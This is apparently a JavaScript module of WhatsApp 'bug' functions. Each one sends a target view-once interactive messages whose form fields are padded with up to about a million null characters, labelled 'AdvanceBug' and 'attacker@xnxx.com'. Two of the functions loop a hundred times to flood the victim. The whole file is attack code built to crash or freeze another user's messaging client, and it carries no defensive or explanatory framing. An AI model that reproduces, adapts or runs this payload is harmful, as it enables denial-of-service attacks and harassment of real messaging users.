exports.sendPaymentInfoMessage = async (neroxz, target) => {
    for (let i = 0; i < 100; i++) {
        await neroxz.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "*🚷▸⃟°̯͜𝚫̸𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐍𝐞𝐫𝐨𝐱⭑ ༑ ⃟̶̽♨️",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: JSON.stringify({
                                    screen_2_OptIn_0: true,
                                    screen_2_OptIn_1: true,
                                    screen_1_Dropdown_0: "AdvanceBug",
                                    screen_1_DatePicker_1: "1028995200000",
                                    screen_1_TextInput_2: "attacker@xnxx.com",
                                    screen_1_TextInput_3: "94643116",
                                    screen_0_TextInput_0: "radio - buttons" + "\u0000".repeat(1020000),
                                    screen_0_TextInput_1: "\u0003",
                                    screen_0_Dropdown_2: "001-Grimgar",
                                    screen_0_RadioButtonsGroup_3: "0_true",
                                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }),
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }
}

exports.sendExtendedTextMessage = async (neroxz, target, text, amount) => {
    await neroxz.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: text,
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: JSON.stringify({
                                screen_2_OptIn_0: true,
                                screen_2_OptIn_1: true,
                                screen_1_Dropdown_0: "TrashDex Superior",
                                screen_1_DatePicker_1: "1028995200000",
                                screen_1_TextInput_2: "devorsixcore@trash.lol",
                                screen_1_TextInput_3: "94643116",
                                screen_0_TextInput_0: "radio - buttons" + "\u0000".repeat(420000),
                                screen_0_TextInput_1: "Anjay",
                                screen_0_Dropdown_2: "001-Grimgar",
                                screen_0_RadioButtonsGroup_3: "0_true",
                                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                            }),
                            version: 3
                        }
                    }
                }
            }
        }, 
        {}
    );
}

exports.OneShot = async (neroxz, target) => {
    for (let i = 0; i < 100; i++) {
        await neroxz.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "*🚷▸⃟°̯͜𝚫̸𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐍𝐞𝐫𝐨𝐱⭑ ༑ ⃟̶̽♨️",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: JSON.stringify({
                                    screen_2_OptIn_0: true,
                                    screen_2_OptIn_1: true,
                                    screen_1_Dropdown_0: "AdvanceBug",
                                    screen_1_DatePicker_1: "1028995200000",
                                    screen_1_TextInput_2: "attacker@xnxx.com",
                                    screen_1_TextInput_3: "94643116",
                                    screen_0_TextInput_0: "radio - buttons" + "\u0000".repeat(1020000),
                                    screen_0_TextInput_1: "\u0003",
                                    screen_0_Dropdown_2: "001-Grimgar",
                                    screen_0_RadioButtonsGroup_3: "0_true",
                                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }),
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }
}
